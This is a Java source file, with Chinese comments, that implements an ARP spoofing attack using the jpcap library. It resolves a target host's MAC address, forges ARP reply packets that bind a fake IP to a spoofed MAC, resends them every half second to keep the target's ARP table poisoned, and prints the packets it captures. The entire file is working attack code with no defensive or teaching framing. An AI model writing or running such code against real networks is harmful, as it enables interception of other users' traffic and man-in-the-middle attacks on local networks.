package org.authenticator;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;

public class LocalListener{
    //伪造的发送者ip 应为确实存在的ip地址
    private final static String IP = "192.168.1.100";
    //伪造的发送者mac  
    private final static byte[] MAC =new IpMacMap(IP).getMac();
    private JpcapCaptor jpcap;              //与设备的连接
    private JpcapSender sender;             //用于发送的实例
    private Packet replyPacket;             //ARP reply包
    private NetworkInterface device;        //当前机器网卡设备
    private IpMacMap targetIpMacMap;        //目的地IP MAC对

    public LocalListener(IpMacMap target) throws Exception {
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
		device = devices[1];
        this.targetIpMacMap = target;
        initSender();
        initPacket();
    }
    
    private void initSender() throws Exception {
        jpcap = JpcapCaptor.openDevice(device, 2000, false, 10000);    //打开与设备的连接
        jpcap.setFilter("ip", true);                                //只监听ip数据包
        sender = jpcap.getJpcapSenderInstance();
    }

    private void initPacket() throws Exception {
        //reply包的源IP和MAC地址，此IP-MAC对将会被映射到ARP表
        IpMacMap targetsSd = new IpMacMap(IP, MAC);  
        //创建修改目标机器ARP的包
        replyPacket = ARPPacketGern.genPacket(targetIpMacMap, targetsSd); 
        //创建以太网头信息，并打包进reply包
        replyPacket.datalink = EthernetPacketGern.genPacket(targetIpMacMap.getMac(),
                MAC);
    }
    public void send(){
    	sender.sendPacket(replyPacket);
    }
    public void listen() throws InterruptedException{
        Thread t = new Thread(new Runnable() {
            public void run(){
              //发送reply封包，修改目的地arp表， arp表会在一段时间内被更新，所以需要不停发送
                while(true){
                    send();  
                    try {
                        Thread.sleep(500);
                    } catch (Exception ex) {
                        System.out.println("Exception :"+ex);
                    }
                }
            }
        });
        t.start();
        //截获当前网络设备的封包收发信息
        while(true){
            IPPacket ipPacket = (IPPacket)jpcap.getPacket();
			if(ipPacket==null){
			  System.out.println("没有获得目标主机的数据包……");    
			}else{
            System.out.println("ipPacket  :"+ipPacket.toString());
			}
        }
    }
    public static void main(String args[]){
    	try{
		ArrayList<IpMacMap> list=new ArrayList<IpMacMap>();
		     //向list添加受控主机的ip及mac
		    list.add(new IpMacMap("192.168.1.2"));
			
			Iterator it=list.iterator();
			while(it.hasNext()){
			   IpMacMap ipMac=(IpMacMap)it.next();
			   new LocalListener(ipMac).listen();
			}
    		
    	}catch(Exception e){
    		System.out.println(e);
    	}
    
      }
    }


//IP-MAC实体，只用于保存一对IP-MAC地址
class IpMacMap {
    private String ip;
    private byte[] mac;
    
	public IpMacMap(String ip) {
	try{
	  this.mac=ARP.arp(InetAddress.getByName(ip));
	  this.ip=ip;
	  }catch(Exception e){
	    System.out.println(e);
	  }
	}
    public IpMacMap(String ip, byte[] mac){
        this.ip = ip;
        this.mac = mac;
    }
    
    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public byte[] getMac() {
        return mac;
    }

    public void setMac(byte[] mac) {
        this.mac = mac;
    }   
    
}

//ARP reply包生成类，用于根据目的地址和源地址生成reply包
class ARPPacketGern{
    public static ARPPacket genPacket(IpMacMap target, IpMacMap sender) throws Exception{
        ARPPacket arpTarget = new ARPPacket();
        arpTarget.hardtype = ARPPacket.HARDTYPE_ETHER;  //选择以太网类型(Ethernet)
        arpTarget.prototype = ARPPacket.PROTOTYPE_IP;         //选择IP网络协议类型
        arpTarget.operation = ARPPacket.ARP_REPLY;              //选择REPLY类型
        arpTarget.hlen = 6;                              //MAC地址长度固定6个字节
        arpTarget.plen = 4;                              //IP地址长度固定4个字节
        arpTarget.target_hardaddr = target.getMac();
        arpTarget.target_protoaddr = InetAddress.getByName(target.getIp()).getAddress();
        arpTarget.sender_hardaddr = sender.getMac();
        arpTarget.sender_protoaddr = InetAddress.getByName(sender.getIp()).getAddress();
        return arpTarget;
    }
}





//根据目的地MAC和源MAC构建以太网头信息，用于传输数据
class EthernetPacketGern{
    public static EthernetPacket genPacket(byte[] targetMac, byte[] senderMac) throws Exception {
        EthernetPacket ethToTarget = new EthernetPacket();           //创建一个以太网头
        ethToTarget.frametype = EthernetPacket.ETHERTYPE_ARP;   //选择以太包类型
        ethToTarget.dst_mac = targetMac;
        ethToTarget.src_mac = senderMac;        
        return ethToTarget;
    }
}

class ARP {
	public static byte[] arp(InetAddress ip) throws java.io.IOException{
		//find network interface
		NetworkInterface[] devices=JpcapCaptor.getDeviceList();
		NetworkInterface device=null;

loop:	for(NetworkInterface d:devices){
			for(NetworkInterfaceAddress addr:d.addresses){
				if(!(addr.address instanceof Inet4Address)) continue;
				byte[] bip=ip.getAddress();
				byte[] subnet=addr.subnet.getAddress();
				byte[] bif=addr.address.getAddress();
				for(int i=0;i<4;i++){
					bip[i]=(byte)(bip[i]&subnet[i]);
					bif[i]=(byte)(bif[i]&subnet[i]);
				}
				if(Arrays.equals(bip,bif)){
					device=d;
					break loop;
				}
			}
		}
		
		if(device==null)
			throw new IllegalArgumentException(ip+" is not a local address");
		
		//open Jpcap
		JpcapCaptor captor=JpcapCaptor.openDevice(device,2000,false,3000);
		captor.setFilter("arp",true);
		JpcapSender sender=captor.getJpcapSenderInstance();
		
		InetAddress srcip=null;
		for(NetworkInterfaceAddress addr:device.addresses)
			if(addr.address instanceof Inet4Address){
				srcip=addr.address;
				break;
			}

		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};
		ARPPacket arp=new ARPPacket();
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;
		arp.prototype=ARPPacket.PROTOTYPE_IP;
		arp.operation=ARPPacket.ARP_REQUEST;
		arp.hlen=6;
		arp.plen=4;
		arp.sender_hardaddr=device.mac_address;
		arp.sender_protoaddr=srcip.getAddress();
		arp.target_hardaddr=broadcast;
		arp.target_protoaddr=ip.getAddress();
		
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac=device.mac_address;
		ether.dst_mac=broadcast;
		arp.datalink=ether;
		
		sender.sendPacket(arp);
		
		while(true){
			ARPPacket p=(ARPPacket)captor.getPacket();
			if(p==null){
				throw new IllegalArgumentException(ip+" is not a local address");
			}
			if(Arrays.equals(p.target_protoaddr,srcip.getAddress())){
				return p.sender_hardaddr;
			}
		}
	  }
	}